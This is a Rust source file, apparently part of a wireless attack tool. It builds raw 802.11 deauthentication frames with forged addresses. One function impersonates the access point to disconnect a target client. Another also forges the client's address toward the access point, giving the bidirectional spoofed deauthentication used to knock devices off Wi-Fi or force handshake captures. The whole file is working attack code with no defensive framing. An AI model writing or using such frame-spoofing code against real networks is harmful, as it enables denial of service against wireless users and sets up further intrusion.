use crate::types::MacAddress;

/// Creates an IEEE 802.11 Deauthentication management frame
pub fn craft_deauth_frame(
    target_client: MacAddress,
    ap_bssid: MacAddress,
    reason_code: u16,
) -> Vec<u8> {
    let mut frame = Vec::with_capacity(26);

    // Frame Control: Type=Management (00), Subtype=Deauth (1100 = 0x0c) -> 0x00c0 in little endian: [0xc0, 0x00]
    frame.extend_from_slice(&[0xc0, 0x00]);

    // Duration: 314 microseconds (standard)
    frame.extend_from_slice(&[0x3a, 0x01]);

    // Address 1: Destination / Receiver (Target client or broadcast)
    frame.extend_from_slice(&target_client.0);

    // Address 2: Source / Transmitter (AP BSSID)
    frame.extend_from_slice(&ap_bssid.0);

    // Address 3: BSSID (AP BSSID)
    frame.extend_from_slice(&ap_bssid.0);

    // Sequence Control: Fragment=0, Sequence=0
    frame.extend_from_slice(&[0x00, 0x00]);

    // Reason Code (2 bytes in little-endian)
    // 7 = Class 3 frame received from nonassociated STA
    frame.extend_from_slice(&reason_code.to_le_bytes());

    frame
}

/// Creates a pair of Deauth frames: one from AP to client, and one from client to AP
pub fn craft_bidirectional_deauth(
    target_client: MacAddress,
    ap_bssid: MacAddress,
) -> (Vec<u8>, Vec<u8>) {
    // 1. AP -> Client (Reason 7)
    let ap_to_client = craft_deauth_frame(target_client, ap_bssid, 7);

    // 2. Client -> AP (Reason 3: Deauthenticated because sending STA is leaving)
    let mut client_to_ap = Vec::with_capacity(26);
    client_to_ap.extend_from_slice(&[0xc0, 0x00, 0x3a, 0x01]);
    client_to_ap.extend_from_slice(&ap_bssid.0);       // Receiver: AP
    client_to_ap.extend_from_slice(&target_client.0);  // Transmitter: Client
    client_to_ap.extend_from_slice(&ap_bssid.0);       // BSSID: AP
    client_to_ap.extend_from_slice(&[0x00, 0x00]);     // Seq
    client_to_ap.extend_from_slice(&3u16.to_le_bytes()); // Reason 3

    (ap_to_client, client_to_ap)
}
